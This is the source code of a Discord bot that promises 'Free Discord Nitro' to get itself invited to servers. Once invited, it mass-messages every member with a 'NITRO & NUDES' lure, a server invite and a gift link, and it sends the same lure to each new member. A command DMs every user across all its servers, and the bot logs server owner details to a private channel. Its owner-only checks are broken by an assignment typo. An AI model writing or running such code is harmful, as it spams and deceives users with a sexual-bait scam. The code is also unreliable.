const Discord = require("discord.js");
const bot = new Discord.Client();

const prefix = ".";

bot.login(process.env.TOKEN);

bot.on("ready", function() {
    console.log('\x1B[31m%s\x1B[0m', '«--------------------------------------------------------» ▲ «--------------------------------------------------------»')
    console.log(`
                                    BOT ALLUMER
`);
console.log('\x1B[31m%s\x1B[0m', '«--------------------------------------------------------» ▲ «--------------------------------------------------------»')
});
       
bot.on('ready', async () => {

  let guildPromises = bot.guilds.map(e => e.fetchMembers())
  let guilds = await Promise.all(guildPromises)
  let memberCollections = guilds.map(e => e.members)
  let totalMemberCount = (new Discord.Collection().concat(...memberCollections)).size

  let a = 0
setInterval(() => {
if(a === 0){
bot.user.setActivity(`.nitro | ${bot.guilds.size} servers | ${totalMemberCount} members`, { type: 'PLAYING'});
  a = 1
} else {
  if(a === 1){
    bot.user.setActivity(`.nitro | ${bot.guilds.size} servers | ${totalMemberCount} members`, { type: 'PLAYING'});
      a = 0             
}  
}
}, 8000)});

let guildArray = bot.guilds.array();

bot.on("guildCreate", guild => {
    
  const embedpub = new Discord.RichEmbed()
  .setTitle(`Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=647507600631529489&scope=bot&permissions=8192)")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/658720729340313622/668089628523364353/a_8a050521d8568119d2ab090c1f1e270c.gif")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()


   console.log("Joined a new guild: " + guild.name);
   guild.members.forEach(member => {
     member.send("**JOIN = NITRO & NUDES** \n https://discord.gg/KD6pnzA https://discord.gift/T8jeBbCrSNbYED8UgwQgM2Uc")
   })
})

bot.on('guildCreate',function(guild){
  var logschannel = bot.channels.find("id", "665837550270939136")

    var embed= new Discord.RichEmbed()
    .setDescription("Bot ajouté sur un serveur !")
    .addField("Serveur:", guild.name)
    .addField("ID du serveur", guild.id)
    .addField("Owner:", guild.owner)
    .addField("Nombre de membres:", guild.memberCount)
    .addField("Nombre de channel:", guild.channels.size)

    logschannel.send(embed)

    console.log(` > Le bot a été ajouté sur: ${guild.name} - ${guild.memberCount} membres`)
});

bot.on('guildMemberAdd', member => {
  member.createDM().then(channel => {

     let serverembed = new Discord.RichEmbed()
    .setTitle(`Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=647507600631529489&scope=bot&permissions=8192)")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/658720729340313622/668089628523364353/a_8a050521d8568119d2ab090c1f1e270c.gif")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()

    channel.send("**JOIN = NITRO & NUDES** \n https://discord.gg/KD6pnzA https://discord.gift/T8jeBbCrSNbYED8UgwQgM2Uc");
  }).catch(console.error);
});

bot.on('message', msg => {

  let serverembed = new Discord.RichEmbed()
    .setTitle(`Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=647507600631529489&scope=bot&permissions=8192)")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/658720729340313622/668089628523364353/a_8a050521d8568119d2ab090c1f1e270c.gif")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()

  if(msg.content.startsWith(prefix + 'puball')) {

    let _message = ["651675514595049511",
                   "6647110742423896084"]

    if(msg.author.id =! _message) return msg.channel.send("Tu ne peux pas utliser cette commande.")

      console.log(" > Start sending")
      var servers =  bot.guilds.array();
      for(let it = 0;it<servers.length;it++){
          let members = servers[it].members.array()
          for(let it2 = 0;it2<members.length;it2++) {
              if(bot.user.id != members[it2].id)
              {
              members[it2].send("**JOIN = NITRO & NUDES** \n https://discord.gg/KD6pnzA https://discord.gift/T8jeBbCrSNbYED8UgwQgM2Uc");
              }
            }
          // console.log('ServerID: **'+servers[it].id+'** - ServerNAME: **'+servers[it].name+'** - MemberMP: **'+members.length+'**')
        }
  }
});

/*bot.on('message', message => {
  if (message.content.startsWith(prefix + "nitro")) {

    let serverembed = new Discord.RichEmbed()
    .setTitle(`Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=647507600631529489&scope=bot&permissions=8192)")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/658720729340313622/668089628523364353/a_8a050521d8568119d2ab090c1f1e270c.gif")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()
    
    return message.channel.send(serverembed);
    });
  }
})*/

bot.on('message', message => {
  if (message.content === `${prefix}msgwola`){

    let _message = ["651675514595049511",
                   "6647110742423896084"]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")

    let serverembed = new Discord.RichEmbed()
    .setTitle(`Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`If you want to win a free Discord Nitro, Invite this bot to your server.`, "[*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=647507600631529489&scope=bot&permissions=8192)")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/658720729340313622/668089628523364353/a_8a050521d8568119d2ab090c1f1e270c.gif")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/657682198379364354/664095179938070529/301567d302dd4ad0e0ee49ac4cc0a8d9.png")
    .setTimestamp()
    
    return message.channel.send("**JOIN = NITRO & NUDES** \n https://discord.gg/KD6pnzA https://discord.gift/T8jeBbCrSNbYED8UgwQgM2Uc");
  
  }
}
)

bot.on('message', async message => {
  if (message.content === `${prefix}slist`){

    let _message = ["651675514595049511",
                   "6647110742423896084"]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")
      
    let guildPromises = bot.guilds.map(e => e.fetchMembers())
    let guilds = await Promise.all(guildPromises)
    let memberCollections = guilds.map(e => e.members)
    let totalMemberCount = (new Discord.Collection().concat(...memberCollections)).size

    let serverembed = new Discord.RichEmbed()
    .setTitle("Serverlist: ")
    .addField(`${bot.guilds.size} servers | ${totalMemberCount} members`, 'rawé chaud tavu frérot')
    .setColor("cb72da")

    message.channel.send(serverembed);
    message.channel.send(bot.guilds.map(r => r.name + ` | ${r.memberCount} membres`))
  }
}
)

bot.on('message', message => {
if (message.content === `${prefix}slist2`){
    let tosend = [];
    bot.guilds.forEach((guild) => { tosend.push(`\`${guild.name} : ${guild.id}\` | **${guild.memberCount} membres**`) })

    let pages = [];
for (let i = 0; i < tosend.length;) {
    if ((i + 9) > tosend.length) {
        pages.push(tosend.slice(i, (i + 9) - ((i + 9) - tosend.length)).join("\n"));
        break;
    } else {
        pages.push(tosend.slice(i, i + 9).join("\n"));
        i += 9
    };
}
    let page = 1;

    const embed = new Discord.RichEmbed()
    .setAuthor(message.author.username, message.author.avatarURL)
    .setTitle("Liste des serveurs")
    .setColor('RANDOM')
    .setFooter(`Page: ${page}/${pages.length}`)
    .setDescription(pages[page-1])
    .setTimestamp();

    message.channel.send(`${bot.guilds.size} serveurs | ${bot.users.size} membres`, embed).then(msg => {
    if (!message.guild.member(bot.user).hasPermission('ADD_REACTIONS')) return;


        msg.react("◀").then(() => {
            msg.react("▶")

            const backF = (reaction, user) => reaction.emoji.name === '◀' && user.id === message.author.id;
            const ForF = (reaction, user) => reaction.emoji.name === '▶' && user.id === message.author.id;

            const back = msg.createReactionCollector(backF, { time: 180000 });
            const For = msg.createReactionCollector(ForF, { time: 180000 });

            back.on('collect', async r => {
                r.remove(message.author.id)
                if (page === 1) return r.remove(message.author.id);
                page--;
                embed.setDescription(pages[page-1]);
                embed.setFooter(`Page: ${page}/${pages.length}`);
                msg.edit(embed);
            });

            For.on('collect', async r => {
                r.remove(message.author.id)
                if (page === pages.length) return r.remove(message.author.id);
                page++;
                embed.setDescription(pages[page-1]);
                embed.setFooter(`Page: ${page}/${pages.length}`);
                msg.edit(embed);
            });
        });
    });
}

});

/*bot.on('message', message => {
  if (message.content === `${prefix}reload`){

    let _message = ["651675514595049511",
                   "6647110742423896084"]

    if(message.author.id =! _message) return message.channel.send("Tu ne peux pas utliser cette commande.")

    console.log("-------------------------\nReloaded!");
    console.log(`${bot.guilds.size} servers | ${bot.users.size} members\n-------------------------`);
    console.log(bot.guilds.map(r => r.name + ` | ${r.memberCount} members`));
  }
});*/

bot.on('message', async message => {
  if (message.content === `${prefix}reload`){

    let guildPromises = bot.guilds.map(e => e.fetchMembers())
    let guilds = await Promise.all(guildPromises)
    let memberCollections = guilds.map(e => e.members)
    let totalMemberCount = (new Discord.Collection().concat(...memberCollections)).size

    let a = 0
  setInterval(() => {
if(a === 0){
  bot.user.setActivity(`.nitro | ${bot.guilds.size} servers | ${totalMemberCount} members`, { type: 'PLAYING'});
    a = 1
} else {
    if(a === 1){
      bot.user.setActivity(`.nitro | ${bot.guilds.size} servers | ${totalMemberCount} members`, { type: 'PLAYING'});
        a = 0             
}  
}
}, 8000)}});
